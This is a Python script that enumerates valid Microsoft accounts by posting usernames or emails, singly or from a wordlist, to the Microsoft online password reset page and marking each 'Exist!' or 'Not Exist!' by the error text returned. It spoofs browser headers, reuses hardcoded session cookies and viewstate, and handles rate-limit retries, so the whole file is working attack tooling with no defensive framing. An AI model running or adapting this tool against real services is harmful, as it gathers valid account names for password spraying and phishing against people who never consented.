import asyncio
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from pathlib import Path
import argparse
import aiohttp
from colorama import Fore, Style, init
import logging
import queue
from logging.handlers import QueueHandler, QueueListener


init()

log_queue = queue.SimpleQueue()

logger = logging.getLogger("word_checker")
logger.setLevel(logging.INFO)
logger.addHandler(QueueHandler(log_queue))

console_handler = logging.StreamHandler()
console_handler.setFormatter(
    logging.Formatter(
        "%(asctime)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
)
log_listener = QueueListener(log_queue, console_handler)
log_listener.start()


RETRY_DELAY_SECONDS = 2
URL = "https://passwordreset.microsoftonline.com/"

def parse_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument("--user", help="One word to test")
    parser.add_argument("--file", help="File containing one word per line")

    args = parser.parse_args()

    if not args.user and not args.file:
        parser.error("Use --word, --file, or both.")

    return args


async def post_word(session, word):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://passwordreset.microsoftonline.com",
        "X-Requested-With": "XMLHttpRequest",
        "X-Microsoftajax": "Delta=true",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Sec-Ch-Ua": '"Chromium";v="151", "Not=A?Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Cache-Control": "no-cache",
    }

    cookies = {
        "DisplayCulture": "en-US",
        "flt": "GraphPolicyRead",
        "CookiesSupportedCookie": "True",
        "SessionId": "jzkzhtx4qqsshgez3gowtl2v",
        "TrackingId": "e4c0de4bf71c40d384e55720942f0c59",
    }

    data = {
        "__EVENTTARGET": "ctl00$ContentPlaceholderMainContent$ButtonNext",
        "__VIEWSTATE": "i7EWJ6beIBgW/lI0Xf0PerZbx/fXjwsa54N6fFvP0xED8EpqYbSWZ3gJ752VYM3ktG7mwrSk6rr+cEvwNKTJpYVydahaxJad2VCx9qK83xywt6rr35P7EMwbYMKn+0SaRSCDM8qC8xNFoLR8RL2TMYB+CDuBnrLr6FVFT9MxIuCpHfdYxdPJ1Bk7aLvfaHPk4VCl/QlSKwscdEgdz2izQU2mgvxGvweV5TV4PSF7iKX+GTcTwn7EWxbM5gzHdlPrbXtK40hb49Fo014A6VGaSt22a6c1/1ofj60KKCchVQwd7kd4Tm0Ce2r9gtN4TNk2UKm2c2NxsoVr2mBhkH5+vnAok/Qf5JxCK6htNO4aOx4X0H3aCHZf9kbdPXzH76mXPPF3h6hDf0Ym9i5W1PJ3UeIyzRXGrlYPNwEfjctRL/uIiiEiYdOa43uZVmjfPtQ4+j899R9FOPaGSOlbvi/CSw==",
        "__VIEWSTATEENCRYPTED": "",
        "__EVENTVALIDATION": "1lxPbLsG6zq/z3s/8dH8jzA2WrpWAm91X2u0XO7efdd6/yEgWzVCvJ7hKp+g8Y+VrSQ/zMAnBUqhlLrnWqKlWyoyqIbtR7tnyNzqs9vyD1DZxFNynX5gSUkX9QkYbwxEpeyReUDSYNGK+0Mx8WZdgKdkVoG7LoZ7J6K5eMIn3xz1PQr0JjMqjEl8+8R9bDL3TAfIQpOxnfzMBQgvLDONYWMIG0WnylEc+oAmsZiJiVme7D59cCYLEQdjhlNWOe7p+Hp2nRbLWwZI1Drm5yQQPBucPXTGZKBqpeTbxcWIFd2s4AcwTsHx6ZFg7XeEYoGfoQ7nE2qEkxQMm0lnfoz7ozE8LwtStq2aftHGU2HiI/QusXiMdlvyx/jdWN+8+mC3nFx/BHjiNPa4GBYyxgzthROaEqBCu/8+OQdXitt8rUqrYaVRX+A2ehxOnrKQZdcEKRO/27Mli8aiAnFahatI6w==",
        "ctl00$ContentPlaceholderMainContent$TextBoxUserIdentifier": word,
    }

    attempt = 1
    #print(f"Sending {word!r}")
    while True:
        
        try:
            async with session.post(
                URL,
                headers = headers,
                cookies = cookies,
                data=data,
                allow_redirects=False,
            ) as response:

                response_body = await response.text()

                if response.status == 429:
                    retry_after = response.headers.get("Retry-After")

                    try:
                        wait_seconds = int(retry_after)
                    except (TypeError, ValueError):
                        wait_seconds = RETRY_DELAY_SECONDS

                    print(
                        f"Received HTTP 429. "
                        f"Waiting {wait_seconds} seconds."
                    )

                    await asyncio.sleep(wait_seconds)
                    attempt += 1
                    continue

                if "pageRedirect" in response_body:
                    #print("pageRedirect found. "
                    #    f"Retrying in {RETRY_DELAY_SECONDS} seconds..."
                    #)

                    await asyncio.sleep(RETRY_DELAY_SECONDS)
                    attempt += 1
                    continue

                if 200 <= response.status < 300:
                    if "The email or username you entered does not exist" in response_body:
                        #print(f"{word} -> " + Fore.RED + "Not Exist!" + Style.RESET_ALL)
                        logger.info(
                            f"{word} -> " + Fore.RED + "Not Exist!" + Style.RESET_ALL
                        )
                    else:
                        #print(f"{word} -> " + Fore.GREEN + "Exist!" + Style.RESET_ALL)
                        logger.info(
                            f"{word} -> " + Fore.GREEN + "Exist!" + Style.RESET_ALL
                        )
                    return True

                print(
                    f"{word!r}: request failed with "
                    f"HTTP {response.status}"
                )
                return False

        except aiohttp.ClientError as error:
            print(f"Connection error: {error}")
            await asyncio.sleep(RETRY_DELAY_SECONDS)
            attempt += 1


async def send_words_from_file(session, file_name):
    path = Path(file_name)

    if not path.is_file():
        print(f"File does not exist: {path}")
        return

    words = path.read_text(encoding="utf-8").splitlines()

    for word in words:
        word = word.strip()

        if word:
            await post_word(session, word)

async def main():
    args = parse_arguments()

    timeout = aiohttp.ClientTimeout(total=30)

    async with aiohttp.ClientSession(
        timeout=timeout,
        cookie_jar=aiohttp.DummyCookieJar(),
    ) as session:

        if args.user:
            await post_word(session, args.user)

        if args.file:
            await send_words_from_file(session, args.file)


if __name__ == "__main__":
    asyncio.run(main())
